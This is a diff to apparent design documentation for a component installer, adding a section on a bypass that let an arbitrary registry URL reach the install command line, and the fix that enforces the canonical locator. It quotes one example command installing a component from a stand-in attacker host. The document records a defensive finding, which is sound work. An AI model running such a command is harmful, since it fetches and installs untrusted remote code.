@@ -206,6 +206,26 @@ application-owned set, exactly `REGISTRY_INTRODUCED_PACKAGE_PINS` — **not** se
 No package NAME is shared between A and B ∪ C, and no registry helper is a D2 id.
 Proven by `test_the_builtin_registry_packages_are_a_separate_application_owned_set`.
 
+### No arbitrary registry URL reaches argv
+
+`RegistryInstallRequest` validates the locator at construction, but
+`install_external_component` is public and a **duck-typed stand-in bypasses the
+constructor**. Confirmed live: such a request carried `https://evil.example/r/x`
+straight into argv (`shadcn add https://evil.example/r/x --yes --overwrite`) and
+only failed *after* running, when materialization did not occur.
+
+Fix: `install_external_component` re-resolves the locator from
+`(source, component_id)` and requires the request's locator to be **exactly** the
+canonical one (`REASON_LOCATOR_NOT_CANONICAL`, **no command**). "Only the
+application-owned canonical locator reaches argv" is now a property of the
+installer, not of the caller using the right type. The control still holds: the
+real SplitText request installs and its argv carries the canonical URL.
+
+Also verified refused (no command): a URL as a component identity on any source
+(`build_registry_request`); a URL inside `dependencies` or
+`registryDependencies`; a URL handed to the builtin path (`install_components`
+rejects it as a component, `commands == []`).
+
 ### What an official builtin may NOT introduce
 
 An official builtin is reviewed to materialize ONLY its own
